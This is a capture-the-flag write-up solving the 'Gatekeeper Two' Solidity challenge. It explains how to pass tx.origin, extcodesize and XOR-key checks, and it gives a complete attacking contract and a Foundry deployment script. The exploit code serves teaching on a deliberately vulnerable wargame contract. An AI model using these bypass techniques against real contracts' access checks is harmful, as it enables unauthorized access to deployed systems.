# Gatekeeper Two

This challenge is similar to the previous one where we needed to become registered as an entrant. We need to pass through three modifiers. Let's analyze each one:

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

The first modifier is identical to the previous challenge - we can bypass it by calling the function through a smart contract.

```solidity
modifier gateTwo() {
    uint256 x;
    assembly {
        x := extcodesize(caller())
    }
    require(x == 0);
    _;
}
```

The second modifier uses assembly to check the code size of the function caller, requiring it to be zero. This seems tricky since we need to use a smart contract (which typically has code) to bypass the first gate. However, there's a solution: calling the function from within the constructor of our smart contract makes this possible, as during construction the code size is indeed zero. More details can be found [here](https://www.rareskills.io/post/solidity-code-length).

```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
```

The third modifier checks if the `_gateKey` meets a specific condition using XOR operations. We need to find a `_gateKey` that, when XORed with a hash of the `msg.sender`, equals `type(uint64).max`.

We can leverage a key property of XOR operations:
- If A ⊕ B = C, then A ⊕ C = B

This property works because XOR is:
1. Reversible
2. Linear

This makes XOR operations useful in many applications but potentially insecure in cryptography if used improperly, as knowing either input or output can reveal the other value. Learn more about XOR [here](https://ctf101.org/cryptography/what-is-xor/) and [here](https://en.wikipedia.org/wiki/XOR_cipher).

We can calculate the required `_gateKey` using:

```solidity
bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
```

## Solution Implementation

Here's the complete solution:

```solidity
//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract Solving {
    constructor(address _victim) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
		(bool success,) = _victim.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
		require(success);
    }
}
```

And the deployment script:

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Solving} from "src/Solving.sol";
import {Script} from "forge-std/Script.sol";

contract SolvingScript is Script {
    address victim = ; /* Your instance address */
    Solving solving;

    function run() public {
        vm.startBroadcast();
        solving = new Solving(victim);
        vm.stopBroadcast();
    }
}
```